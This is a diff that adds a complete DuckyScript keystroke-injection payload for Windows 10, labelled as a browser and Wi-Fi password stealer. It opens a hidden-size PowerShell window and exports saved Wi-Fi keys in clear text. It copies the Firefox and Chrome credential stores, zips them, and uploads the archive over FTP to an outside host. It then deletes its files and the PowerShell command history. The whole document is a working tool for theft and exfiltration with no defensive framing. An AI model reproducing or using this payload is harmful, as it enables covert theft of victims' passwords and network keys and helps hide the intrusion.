@@ -1,0 +1,61 @@
+REM Browsers and Wifi Passwords stealer - W10 - V1.5
+
+DELAY 2000
+WINDOWS d
+DELAY 1000
+
+WINDOWS r
+DELAY 1000
+STRING powershell -noexit -command "[console]::WindowWidth=5; [console]::WindowHeight=1; [console]::BufferWidth=[console]::WindowWidth"
+DELAY 500
+ENTER
+DELAY 2000
+STRING mkdir 'C:\wp_pwd'; netsh wlan export profile folder='C:\wp_pwd\' key=clear; 
+ENTER 
+
+STRING mkdir 'C:\wp_pwd\Browser\Firefox';mkdir 'C:\wp_pwd\Browser\Chrome';$p = "$env:appdata\Mozilla\Firefox\Profiles\*.*-release\"
+ENTER
+STRING Copy-Item -Path $p'*.db' -Recurse C:\wp_pwd\Browser\Firefox -Force; Copy-Item -Path $p'logins.json' -Recurse C:\wp_pwd\Browser\Firefox -Force; Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Recurse C:\wp_pwd\Browser\Chrome -Force
+ENTER
+DELAY 500
+
+STRING Compress-Archive -Path 'C:\wp_pwd\*' -DestinationPath 'C:\wp_pwd\wp_pwd.zip'; 
+ENTER
+DELAY 500 
+STRING del C:\wp_pwd\*.xml
+ENTER
+
+STRING $Dir="C:\wp_pwd\wp_pwd.zip";
+ENTER
+STRING $ftp = "ftp://ftp.drivehq.com/"
+ENTER
+STRING $user = "<YOUR EMAIL>" 
+ENTER
+STRING $pass = "<YOUR PASSWORD>"
+ENTER
+STRING $webclient = New-Object System.Net.WebClient
+ENTER
+STRING $webclient.Credentials = New-Object System.Net.NetworkCredential($user,$pass)
+ENTER
+STRING foreach($item in (dir $Dir "*.*")){
+ENTER
+STRING $uri = New-Object System.Uri($ftp+$item.Name)
+ENTER
+STRING $webclient.UploadFile($uri, $item.FullName)
+ENTER
+STRING $date = (Get-Date).ToString('MM-dd-yyyy')
+ENTER
+STRING $path = "C:\wp_pwd\wp_pwd.zip" + $date
+ENTER
+STRING If(!(test-path $path))
+ENTER
+STRING {
+ENTER
+STRING New-Item -ItemType Directory -Force -Path $path
+ENTER
+STRING }
+ENTER
+STRING Move-Item $item.FullName -destination $path
+ENTER
+STRING }; del C:\wp_pwd -Recurse; del (Get-PSReadlineOption).HistorySavePath; exit
+ENTER
